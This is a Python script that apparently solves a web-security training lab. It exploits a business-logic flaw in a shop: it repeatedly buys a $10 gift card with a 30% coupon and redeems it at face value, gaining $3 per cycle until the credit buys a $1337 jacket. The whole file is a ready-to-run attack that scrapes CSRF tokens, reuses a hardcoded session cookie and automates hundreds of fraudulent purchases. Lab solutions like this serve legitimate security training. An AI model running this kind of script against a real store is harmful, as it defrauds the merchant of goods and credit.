#!/usr/bin/env python3
# Infinite money logic flaw — buy a $10 gift card with a 30% coupon and redeem it
# at face value. Each cycle adds $3 to the store credit.
#
# Cycle:
#   1. POST /cart          -> add the $10 gift card (productId=2)
#   2. POST /cart/coupon   -> apply SIGNUP30 (30% off -> $7)
#   3. POST /cart/checkout -> place the order
#   4. GET  /cart/order-confirmation?order-confirmed=true -> read the gift card code
#   5. POST /gift-card     -> redeem the code (+$10 credit)
#
# Repeat until the store credit covers the jacket ($1337), then buy productId=1.
#
# Replace HOST / SESSION with your own lab instance.

import re
import sys
import time
import urllib.parse
import urllib.request

HOST = "0ac700400384c191827174dd00e60099.web-security-academy.net"
SESSION = "tZTWsVQzvV4JNVHcHV5gNomjXqfOHA5n"

GIFT_CARD = "2"   # $10 gift card
JACKET = "1"      # $1337 leather jacket
COUPON = "SIGNUP30"

CYCLES = 413      # (~$1237 needed / $3 per cycle)


def req(path, data=None):
    url = "https://%s%s" % (HOST, path)
    body = urllib.parse.urlencode(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "session=" + SESSION,
        "User-Agent": "Mozilla/5.0",
    })
    return urllib.request.urlopen(r, timeout=30).read().decode("utf-8", "replace")


def csrf(path="/my-account"):
    m = re.search(r'name="csrf" value="([^"]+)"', req(path))
    if not m:
        raise RuntimeError("csrf not found on " + path)
    return m.group(1)


def credit():
    m = re.search(r"Store credit:\s*\$([\d.]+)", req("/my-account"))
    return float(m.group(1)) if m else None


def gift_card_code():
    html = req("/cart/order-confirmation?order-confirmed=true")
    # the code is shown at the bottom of the confirmation page (10 alphanumeric chars)
    codes = re.findall(r"\b[A-Za-z0-9]{10}\b", html)
    return codes[-1] if codes else None


def cycle(token):
    req("/cart", {"productId": GIFT_CARD, "redir": "PRODUCT", "quantity": "1"})
    req("/cart/coupon", {"csrf": token, "coupon": COUPON})
    req("/cart/checkout", {"csrf": token})

    code = gift_card_code()
    if not code:
        raise RuntimeError("gift card code not found")

    req("/gift-card", {"csrf": token, "gift-card": code})
    return code


def main():
    token = csrf()
    print("initial credit: $%.2f" % (credit() or 0))

    for i in range(1, CYCLES + 1):
        try:
            code = cycle(token)
        except Exception as e:
            print("cycle %d failed: %s" % (i, e))
            time.sleep(2)
            token = csrf()  # refresh in case the session/token rotated
            continue

        if i % 10 == 0:
            print("cycle %d | code %s | credit $%.2f" % (i, code, credit() or 0))

        if (credit() or 0) >= 1337:
            break

    print("final credit: $%.2f" % (credit() or 0))

    # buy the jacket
    token = csrf()
    req("/cart", {"productId": JACKET, "redir": "PRODUCT", "quantity": "1"})
    req("/cart/checkout", {"csrf": token})
    print("checkout sent — lab should be solved")


if __name__ == "__main__":
    sys.exit(main())
